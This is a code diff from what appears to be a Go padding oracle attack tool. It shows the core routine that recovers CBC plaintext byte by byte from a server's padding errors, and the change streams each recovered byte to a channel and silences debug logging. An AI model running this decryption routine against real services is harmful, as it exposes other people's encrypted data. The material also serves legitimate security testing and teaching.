@@ -5,7 +5,7 @@ import (
 	"log"
 )
 
-func decipherChunk(chunk []byte) ([]byte, error) {
+func decipherChunk(chunk []byte, outChan chan byte) ([]byte, error) {
 	/* okay, we're now very close to the Padding Oracle core technique */
 	plainText := make([]byte, blockLen)
 
@@ -13,7 +13,7 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 	// and repeat the same procedure for every byte in that block
 
 	for pos := blockLen - 1; pos >= 0; pos-- {
-		log.Printf("Getting pos %d", pos)
+		//log.Printf("Getting pos %d", pos)
 		originalByte := chunk[pos]
 
 		found, foundByte, err := findGoodByte(chunk, pos, originalByte)
@@ -36,7 +36,7 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 				log.Fatal("Failed to decrypt, not a byte got in without padding error. \nThe root cause migth be in Unpadding implementation on the server side!")
 			}
 
-			log.Printf("Only original byte fits at position %d.You probably just hit the original padding", pos)
+			//log.Printf("Only original byte fits at position %d.You probably just hit the original padding", pos)
 			foundByte = originalByte
 		}
 
@@ -52,6 +52,9 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 		then OPT = OCB ^ TCB ^ TPT */
 		currPaddingValue := byte(16 - pos)
 		plainText[pos] = foundByte ^ originalByte ^ currPaddingValue
+		if outChan != nil {
+			outChan <- plainText[pos]
+		}
 
 		/* good! we're done with this byte, do we forget something?
 		yes, we actually need to repair the padding for the next shot
@@ -104,20 +107,19 @@ func findGoodByte(chunk []byte, pos int, original byte) (bool, byte, error) {
 
 			if err != nil {
 				if ctx.Err() != context.Canceled {
-					log.Println(err)
+					//log.Println(err)
 					chanErr <- err
 				}
 				return
 			}
 			if !paddingError {
-				log.Printf("found good value! for %d", value)
+				//log.Printf("found good value! for %d", value)
 				chanVal <- value
 			}
 		}(tamperedByte)
 	}
 
 	// now process the results
-	//t := time.NewTicker(time.Second * 5)
 	done := 1
 	for {
 		select {
@@ -128,10 +130,10 @@ func findGoodByte(chunk []byte, pos int, original byte) (bool, byte, error) {
 				return false, 0, nil
 			}
 		case err := <-chanErr:
-			log.Println("ErrChan")
+			//log.Println("ErrChan")
 			return false, 0, err
 		case val := <-chanVal:
-			log.Println("valChan")
+			//log.Println("valChan")
 			return true, val, nil
 		default:
 			continue
